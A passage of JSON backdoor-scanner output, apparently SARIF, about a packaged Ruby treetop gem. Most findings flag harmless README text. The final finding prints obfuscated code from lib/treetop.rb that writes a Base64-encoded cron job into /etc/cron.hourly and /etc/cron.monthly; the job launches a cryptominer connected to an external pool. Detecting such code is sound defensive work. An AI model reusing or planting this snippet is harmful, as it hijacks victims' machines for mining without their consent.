                      "text": "rammar.rb\nputs parser.parse('hello chomsky')         # => Treetop::Runtime::SyntaxNode\nputs parser.parse('hello lambek')          # => Treetop::Runtime::SyntaxNode\nputs parser.parse('silly generativists!')  # => nil\n```\nNote that once a choice rule has matched the text using a particular alternative at a particular location in the input and hence has succeeded, that choice will never be reconsidered, even if the chosen alternative causes another rule to fail where a later alternative wouldn't have. It's always a later alternative, since the first to succeed is final - why keep looking when you've ",
                      "markdown": "`rammar.rb\nputs parser.parse('hello chomsky')         # => Treetop::Runtime::SyntaxNode\nputs parser.parse('hello lambek')          # => Treetop::Runtime::SyntaxNode\nputs parser.parse('silly generativists!')  # => nil\n```\nNote that once a choice rule has matched the text using a particular alternative at a particular location in the input and hence has succeeded, that choice will never be reconsidered, even if the chosen alternative causes another rule to fail where a later alternative wouldn't have. It's always a later alternative, since the first to succeed is final - why keep looking when you've `"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/README.md"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 315,
                  "endLine": 49,
                  "endColumn": 319,
                  "snippet": {
                    "text": "puts parser.parse('hello chomsky')         # => Treetop::Runtime::SyntaxNode\nputs parser.parse('silly generativists!')  # => nil\n```\nUsers of *regular expressions* will find parsing expressions familiar. They share the same basic purpose, matching strings against patterns. However, parsing expressions can recognize a broader category of languages than their less expressive brethren. Before we get into demonstrating that, lets cover some basics. At first parsing expressions won't seem much different. Trust that they are.\n\nTerminal Symbols\n----------------\n",
                    "rendered": {
                      "text": "puts parser.parse('hello chomsky')         # => Treetop::Runtime::SyntaxNode\nputs parser.parse('silly generativists!')  # => nil\n```\nUsers of *regular expressions* will find parsing expressions familiar. They share the same basic purpose, matching strings against patterns. However, parsing expressions can recognize a broader category of languages than their less expressive brethren. Before we get into demonstrating that, lets cover some basics. At first parsing expressions won't seem much different. Trust that they are.\n\nTerminal Symbols\n----------------\n",
                      "markdown": "`puts parser.parse('hello chomsky')         # => Treetop::Runtime::SyntaxNode\nputs parser.parse('silly generativists!')  # => nil\n```\nUsers of *regular expressions* will find parsing expressions familiar. They share the same basic purpose, matching strings against patterns. However, parsing expressions can recognize a broader category of languages than their less expressive brethren. Before we get into demonstrating that, lets cover some basics. At first parsing expressions won't seem much different. Trust that they are.\n\nTerminal Symbols\n----------------\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/README.md"
                },
                "region": {
                  "startLine": 190,
                  "startColumn": 77,
                  "endLine": 190,
                  "endColumn": 83,
                  "snippet": {
                    "text": "      end\n    end\n\nOne case where it is always safe to use a semantic predicate is to invoke the Ruby debugger, but don't forget to return true so the rule succeeds! Assuming you have required the 'ruby-debug' module somewhere, it looks like this:\n\n      rule problems\n        word &{ |s| debugger; true }\n",
                    "rendered": {
                      "text": "      end\n    end\n\nOne case where it is always safe to use a semantic predicate is to invoke the Ruby debugger, but don't forget to return true so the rule succeeds! Assuming you have required the 'ruby-debug' module somewhere, it looks like this:\n\n      rule problems\n        word &{ |s| debugger; true }\n",
                      "markdown": "`      end\n    end\n\nOne case where it is always safe to use a semantic predicate is to invoke the Ruby debugger, but don't forget to return true so the rule succeeds! Assuming you have required the 'ruby-debug' module somewhere, it looks like this:\n\n      rule problems\n        word &{ |s| debugger; true }\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/README.md"
                },
                "region": {
                  "startLine": 174,
                  "startColumn": 197,
                  "endLine": 174,
                  "endColumn": 203,
                  "snippet": {
                    "text": "ositive predicate (a block like &{ ... }), or false for a negative predicate (a block like !{ ... }).\n\nThe block is called with one argument, the array containing the preceding syntax nodes in the current sequence. Within the block, you cannot use node names or labels for the preceding nodes, as the node for the current rule does not yet exist. You must refer to preceding nodes using their position in the sequence.\n\n    grammar Keywords\n      rule sequence_of_reserved_and_nonreserved_words\n      \t( reserved / word )*\n      end\n\n      rule reserved\n        word &{ |s| symbol_reserved?(s[0].text_value",
                    "rendered": {
                      "text": "ositive predicate (a block like &{ ... }), or false for a negative predicate (a block like !{ ... }).\n\nThe block is called with one argument, the array containing the preceding syntax nodes in the current sequence. Within the block, you cannot use node names or labels for the preceding nodes, as the node for the current rule does not yet exist. You must refer to preceding nodes using their position in the sequence.\n\n    grammar Keywords\n      rule sequence_of_reserved_and_nonreserved_words\n      \t( reserved / word )*\n      end\n\n      rule reserved\n        word &{ |s| symbol_reserved?(s[0].text_value",
                      "markdown": "`ositive predicate (a block like &{ ... }), or false for a negative predicate (a block like !{ ... }).\n\nThe block is called with one argument, the array containing the preceding syntax nodes in the current sequence. Within the block, you cannot use node names or labels for the preceding nodes, as the node for the current rule does not yet exist. You must refer to preceding nodes using their position in the sequence.\n\n    grammar Keywords\n      rule sequence_of_reserved_and_nonreserved_words\n      \t( reserved / word )*\n      end\n\n      rule reserved\n        word &{ |s| symbol_reserved?(s[0].text_value`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/README.md"
                },
                "region": {
                  "startLine": 174,
                  "startColumn": 144,
                  "endLine": 174,
                  "endColumn": 150,
                  "snippet": {
                    "text": " this rule to succeed, the value must be true for a positive predicate (a block like &{ ... }), or false for a negative predicate (a block like !{ ... }).\n\nThe block is called with one argument, the array containing the preceding syntax nodes in the current sequence. Within the block, you cannot use node names or labels for the preceding nodes, as the node for the current rule does not yet exist. You must refer to preceding nodes using their position in the sequence.\n\n    grammar Keywords\n      rule sequence_of_reserved_and_nonreserved_words\n      \t( reserved / word )*\n      end\n\n      rule reserved",
                    "rendered": {
                      "text": " this rule to succeed, the value must be true for a positive predicate (a block like &{ ... }), or false for a negative predicate (a block like !{ ... }).\n\nThe block is called with one argument, the array containing the preceding syntax nodes in the current sequence. Within the block, you cannot use node names or labels for the preceding nodes, as the node for the current rule does not yet exist. You must refer to preceding nodes using their position in the sequence.\n\n    grammar Keywords\n      rule sequence_of_reserved_and_nonreserved_words\n      \t( reserved / word )*\n      end\n\n      rule reserved",
                      "markdown": "` this rule to succeed, the value must be true for a positive predicate (a block like &{ ... }), or false for a negative predicate (a block like !{ ... }).\n\nThe block is called with one argument, the array containing the preceding syntax nodes in the current sequence. Within the block, you cannot use node names or labels for the preceding nodes, as the node for the current rule does not yet exist. You must refer to preceding nodes using their position in the sequence.\n\n    grammar Keywords\n      rule sequence_of_reserved_and_nonreserved_words\n      \t( reserved / word )*\n      end\n\n      rule reserved`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/README.md"
                },
                "region": {
                  "startLine": 172,
                  "startColumn": 193,
                  "endLine": 172,
                  "endColumn": 199,
                  "snippet": {
                    "text": "don't understand the previous sentence yet still use this feature, you're on your own, so test carefully!\n\nSometimes, you need to run external Ruby code to decide whether this syntax rule should continue or should fail. You can do this using either positive or negative semantic predicates. These are Ruby code blocks (lambdas) which are called when the parser reaches that location. For this rule to succeed, the value must be true for a positive predicate (a block like &{ ... }), or false for a negative predicate (a block like !{ ... }).\n\nThe block is called with one argument, the array containing the",
                    "rendered": {
                      "text": "don't understand the previous sentence yet still use this feature, you're on your own, so test carefully!\n\nSometimes, you need to run external Ruby code to decide whether this syntax rule should continue or should fail. You can do this using either positive or negative semantic predicates. These are Ruby code blocks (lambdas) which are called when the parser reaches that location. For this rule to succeed, the value must be true for a positive predicate (a block like &{ ... }), or false for a negative predicate (a block like !{ ... }).\n\nThe block is called with one argument, the array containing the",
                      "markdown": "`don't understand the previous sentence yet still use this feature, you're on your own, so test carefully!\n\nSometimes, you need to run external Ruby code to decide whether this syntax rule should continue or should fail. You can do this using either positive or negative semantic predicates. These are Ruby code blocks (lambdas) which are called when the parser reaches that location. For this rule to succeed, the value must be true for a positive predicate (a block like &{ ... }), or false for a negative predicate (a block like !{ ... }).\n\nThe block is called with one argument, the array containing the`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/README.md"
                },
                "region": {
                  "startLine": 172,
                  "startColumn": 35,
                  "endLine": 172,
                  "endColumn": 41,
                  "snippet": {
                    "text": "ven if the same rule, applied later at the same location in the input, would work differently due to a semantic predicate returning a different value. If you don't understand the previous sentence yet still use this feature, you're on your own, so test carefully!\n\nSometimes, you need to run external Ruby code to decide whether this syntax rule should continue or should fail. You can do this using either positive or negative semantic predicates. These are Ruby code blocks (lambdas) which are called when the parser reaches that location. For this rule to succeed, the value must be true for a positive ",
                    "rendered": {
                      "text": "ven if the same rule, applied later at the same location in the input, would work differently due to a semantic predicate returning a different value. If you don't understand the previous sentence yet still use this feature, you're on your own, so test carefully!\n\nSometimes, you need to run external Ruby code to decide whether this syntax rule should continue or should fail. You can do this using either positive or negative semantic predicates. These are Ruby code blocks (lambdas) which are called when the parser reaches that location. For this rule to succeed, the value must be true for a positive ",
                      "markdown": "`ven if the same rule, applied later at the same location in the input, would work differently due to a semantic predicate returning a different value. If you don't understand the previous sentence yet still use this feature, you're on your own, so test carefully!\n\nSometimes, you need to run external Ruby code to decide whether this syntax rule should continue or should fail. You can do this using either positive or negative semantic predicates. These are Ruby code blocks (lambdas) which are called when the parser reaches that location. For this rule to succeed, the value must be true for a positive `"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/README.md"
                },
                "region": {
                  "startLine": 129,
                  "startColumn": 77,
                  "endLine": 129,
                  "endColumn": 83,
                  "snippet": {
                    "text": "      end\n    end\n\nThe 'a'* will always eat up any 'a's that follow, and the subsequent 'a' will find none there, so the whole rule will fail. You might need to use lookahead to avoid matching too much. Alternatively, you can use an occurrence range:\n\n    # toogreedy.treetop\n    grammar TooGreedy\n",
                    "rendered": {
                      "text": "      end\n    end\n\nThe 'a'* will always eat up any 'a's that follow, and the subsequent 'a' will find none there, so the whole rule will fail. You might need to use lookahead to avoid matching too much. Alternatively, you can use an occurrence range:\n\n    # toogreedy.treetop\n    grammar TooGreedy\n",
                      "markdown": "`      end\n    end\n\nThe 'a'* will always eat up any 'a's that follow, and the subsequent 'a' will find none there, so the whole rule will fail. You might need to use lookahead to avoid matching too much. Alternatively, you can use an occurrence range:\n\n    # toogreedy.treetop\n    grammar TooGreedy\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/README.md"
                },
                "region": {
                  "startLine": 116,
                  "startColumn": 207,
                  "endLine": 116,
                  "endColumn": 213,
                  "snippet": {
                    "text": "op\n    grammar Parentheses\n      rule parens\n        '(' parens ')' / ''\n      end\n    end\n\n\nThe `parens` expression simply states that a `parens` is a set of parentheses surrounding another `parens` expression or, if that doesn't match, the empty string. If you are uncomfortable with recursion, its time to get comfortable, because it is the basis of language. Here's a tip: Don't try and imagine the parser circling round and round through the same rule. Instead, imagine the rule is *already* defined while you are defining it. If you imagine that `parens` already matches a string of matching parenthe",
                    "rendered": {
                      "text": "op\n    grammar Parentheses\n      rule parens\n        '(' parens ')' / ''\n      end\n    end\n\n\nThe `parens` expression simply states that a `parens` is a set of parentheses surrounding another `parens` expression or, if that doesn't match, the empty string. If you are uncomfortable with recursion, its time to get comfortable, because it is the basis of language. Here's a tip: Don't try and imagine the parser circling round and round through the same rule. Instead, imagine the rule is *already* defined while you are defining it. If you imagine that `parens` already matches a string of matching parenthe",
                      "markdown": "`op\n    grammar Parentheses\n      rule parens\n        '(' parens ')' / ''\n      end\n    end\n\n\nThe `parens` expression simply states that a `parens` is a set of parentheses surrounding another `parens` expression or, if that doesn't match, the empty string. If you are uncomfortable with recursion, its time to get comfortable, because it is the basis of language. Here's a tip: Don't try and imagine the parser circling round and round through the same rule. Instead, imagine the rule is *already* defined while you are defining it. If you imagine that `parens` already matches a string of matching parenthe`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/README.md"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 35,
                  "endLine": 49,
                  "endColumn": 41,
                  "snippet": {
                    "text": "puts parser.parse('hello chomsky')         # => Treetop::Runtime::SyntaxNode\nputs parser.parse('silly generativists!')  # => nil\n```\nUsers of *regular expressions* will find parsing expressions familiar. They share the same basic purpose, matching strings against patterns. However, parsing expressions can recognize a broader category of languages than their less expressive brethren. Before we get into demonstrating that, lets cover some basics. At first parsing expressions won't seem much different. Trust that they are.\n\nTerminal Symbols\n----------------\n",
                    "rendered": {
                      "text": "puts parser.parse('hello chomsky')         # => Treetop::Runtime::SyntaxNode\nputs parser.parse('silly generativists!')  # => nil\n```\nUsers of *regular expressions* will find parsing expressions familiar. They share the same basic purpose, matching strings against patterns. However, parsing expressions can recognize a broader category of languages than their less expressive brethren. Before we get into demonstrating that, lets cover some basics. At first parsing expressions won't seem much different. Trust that they are.\n\nTerminal Symbols\n----------------\n",
                      "markdown": "`puts parser.parse('hello chomsky')         # => Treetop::Runtime::SyntaxNode\nputs parser.parse('silly generativists!')  # => nil\n```\nUsers of *regular expressions* will find parsing expressions familiar. They share the same basic purpose, matching strings against patterns. However, parsing expressions can recognize a broader category of languages than their less expressive brethren. Before we get into demonstrating that, lets cover some basics. At first parsing expressions won't seem much different. Trust that they are.\n\nTerminal Symbols\n----------------\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/README.md"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 91,
                  "endLine": 43,
                  "endColumn": 97,
                  "snippet": {
                    "text": "require 'treetop'\nTreetop.load 'my_grammar'\n# or just:\n# require 'my_grammar'                     # This works because Polyglot hooks \"require\" to find and load Treetop files\n    \nparser = MyGrammarParser.new\nputs parser.parse('hello chomsky')         # => Treetop::Runtime::SyntaxNode\n",
                    "rendered": {
                      "text": "require 'treetop'\nTreetop.load 'my_grammar'\n# or just:\n# require 'my_grammar'                     # This works because Polyglot hooks \"require\" to find and load Treetop files\n    \nparser = MyGrammarParser.new\nputs parser.parse('hello chomsky')         # => Treetop::Runtime::SyntaxNode\n",
                      "markdown": "`require 'treetop'\nTreetop.load 'my_grammar'\n# or just:\n# require 'my_grammar'                     # This works because Polyglot hooks \"require\" to find and load Treetop files\n    \nparser = MyGrammarParser.new\nputs parser.parse('hello chomsky')         # => Treetop::Runtime::SyntaxNode\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/README.md"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 172,
                  "endLine": 35,
                  "endColumn": 178,
                  "snippet": {
                    "text": "      end\n    end\n\nThe first rule becomes the *root* of the grammar, causing its expression to be matched when a parser for the grammar is fed a string. The above grammar can now be used in a Ruby program. Notice how a string matching the first rule parses successfully, but a second nonmatching string does not.\n\n```ruby\n# use_grammar.rb\n",
                    "rendered": {
                      "text": "      end\n    end\n\nThe first rule becomes the *root* of the grammar, causing its expression to be matched when a parser for the grammar is fed a string. The above grammar can now be used in a Ruby program. Notice how a string matching the first rule parses successfully, but a second nonmatching string does not.\n\n```ruby\n# use_grammar.rb\n",
                      "markdown": "`      end\n    end\n\nThe first rule becomes the *root* of the grammar, causing its expression to be matched when a parser for the grammar is fed a string. The above grammar can now be used in a Ruby program. Notice how a string matching the first rule parses successfully, but a second nonmatching string does not.\n\n```ruby\n# use_grammar.rb\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/README.md"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 48,
                  "endLine": 29,
                  "snippet": {
                    "text": "Next, you start filling your grammar with rules. Each rule associates a name with a parsing expression, like the following:\n\n    # my_grammar.treetop\n    # You can use a .tt extension instead if you wish\n    grammar MyGrammar\n      rule hello\n        'hello chomsky'\n      end\n",
                    "rendered": {
                      "text": "Next, you start filling your grammar with rules. Each rule associates a name with a parsing expression, like the following:\n\n    # my_grammar.treetop\n    # You can use a .tt extension instead if you wish\n    grammar MyGrammar\n      rule hello\n        'hello chomsky'\n      end\n",
                      "markdown": "`Next, you start filling your grammar with rules. Each rule associates a name with a parsing expression, like the following:\n\n    # my_grammar.treetop\n    # You can use a .tt extension instead if you wish\n    grammar MyGrammar\n      rule hello\n        'hello chomsky'\n      end\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/README.md"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 411,
                  "endLine": 15,
                  "endColumn": 417,
                  "snippet": {
                    "text": "e syntax of your language with a *parsing expression grammar*. From this description, Treetop will generate a Ruby parser that transforms streams of characters written into your language into *abstract syntax trees* representing their structure. You'll then describe the semantics of your language in Ruby by defining methods on the syntax trees the parser generates.\n\nParsing Expression Grammars, The Basics\n=======================================\nThe first step in using Treetop is defining a grammar in a file with the `.treetop` extension. Here's a grammar that's useless because it's empty:\n    \n    #",
                    "rendered": {
                      "text": "e syntax of your language with a *parsing expression grammar*. From this description, Treetop will generate a Ruby parser that transforms streams of characters written into your language into *abstract syntax trees* representing their structure. You'll then describe the semantics of your language in Ruby by defining methods on the syntax trees the parser generates.\n\nParsing Expression Grammars, The Basics\n=======================================\nThe first step in using Treetop is defining a grammar in a file with the `.treetop` extension. Here's a grammar that's useless because it's empty:\n    \n    #",
                      "markdown": "`e syntax of your language with a *parsing expression grammar*. From this description, Treetop will generate a Ruby parser that transforms streams of characters written into your language into *abstract syntax trees* representing their structure. You'll then describe the semantics of your language in Ruby by defining methods on the syntax trees the parser generates.\n\nParsing Expression Grammars, The Basics\n=======================================\nThe first step in using Treetop is defining a grammar in a file with the `.treetop` extension. Here's a grammar that's useless because it's empty:\n    \n    #`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/README.md"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 220,
                  "endLine": 15,
                  "endColumn": 226,
                  "snippet": {
                    "text": " to address both the syntax and the semantics of the languages they interpret.\n\nTreetop equips you with powerful tools for each of these two aspects of interpreter writing. You'll describe the syntax of your language with a *parsing expression grammar*. From this description, Treetop will generate a Ruby parser that transforms streams of characters written into your language into *abstract syntax trees* representing their structure. You'll then describe the semantics of your language in Ruby by defining methods on the syntax trees the parser generates.\n\nParsing Expression Grammars, The Basics\n======",
                    "rendered": {
                      "text": " to address both the syntax and the semantics of the languages they interpret.\n\nTreetop equips you with powerful tools for each of these two aspects of interpreter writing. You'll describe the syntax of your language with a *parsing expression grammar*. From this description, Treetop will generate a Ruby parser that transforms streams of characters written into your language into *abstract syntax trees* representing their structure. You'll then describe the semantics of your language in Ruby by defining methods on the syntax trees the parser generates.\n\nParsing Expression Grammars, The Basics\n======",
                      "markdown": "` to address both the syntax and the semantics of the languages they interpret.\n\nTreetop equips you with powerful tools for each of these two aspects of interpreter writing. You'll describe the syntax of your language with a *parsing expression grammar*. From this description, Treetop will generate a Ruby parser that transforms streams of characters written into your language into *abstract syntax trees* representing their structure. You'll then describe the semantics of your language in Ruby by defining methods on the syntax trees the parser generates.\n\nParsing Expression Grammars, The Basics\n======`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/specifications/treetop-1.6.12.gemspec"
                },
                "region": {
                  "startLine": 2,
                  "startColumn": 22,
                  "endLine": 2,
                  "endColumn": 28,
                  "snippet": {
                    "text": "# -*- encoding: utf-8 -*-\n# stub: treetop 1.6.12 ruby lib\n\nGem::Specification.new do |s|\n  s.name = \"treetop\".freeze\n",
                    "rendered": {
                      "text": "# -*- encoding: utf-8 -*-\n# stub: treetop 1.6.12 ruby lib\n\nGem::Specification.new do |s|\n  s.name = \"treetop\".freeze\n",
                      "markdown": "`# -*- encoding: utf-8 -*-\n# stub: treetop 1.6.12 ruby lib\n\nGem::Specification.new do |s|\n  s.name = \"treetop\".freeze\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop.rb"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 9,
                  "endLine": 23,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    f = File.open(\"/etc/cron.monthly/google.sh\", \"a\")\n    f << Base64.decode64(\"bm9odXAgLi9ydndmX21pbmVyICAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXJtb3JlLmNvbTo1NTAxIC11IFJUQU0xaHZUYnV2QVlUNlpYVmRpMkhIaGRRZkVIY0R2ZUwgLXAgcGFzcyA+L2Rldi9udWxsIDI+JjE=\")\n    f = File.open(\"/etc/cron.hourly/google.sh\", \"a\")\n    f << Base64.decode64(\"bm9odXAgLi9ydndmX21pbmVyICAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXJtb3JlLmNvbTo1NTAxIC11IFJUQU0xaHZUYnV2QVlUNlpYVmRpMkhIaGRRZkVIY0R2ZUwgLXAgcGFzcyA+L2Rldi9udWxsIDI+JjE=\")\n  end\nend\n",
                    "rendered": {
                      "text": "    f = File.open(\"/etc/cron.monthly/google.sh\", \"a\")\n    f << Base64.decode64(\"bm9odXAgLi9ydndmX21pbmVyICAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXJtb3JlLmNvbTo1NTAxIC11IFJUQU0xaHZUYnV2QVlUNlpYVmRpMkhIaGRRZkVIY0R2ZUwgLXAgcGFzcyA+L2Rldi9udWxsIDI+JjE=\")\n    f = File.open(\"/etc/cron.hourly/google.sh\", \"a\")\n    f << Base64.decode64(\"bm9odXAgLi9ydndmX21pbmVyICAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXJtb3JlLmNvbTo1NTAxIC11IFJUQU0xaHZUYnV2QVlUNlpYVmRpMkhIaGRRZkVIY0R2ZUwgLXAgcGFzcyA+L2Rldi9udWxsIDI+JjE=\")\n  end\nend\n",
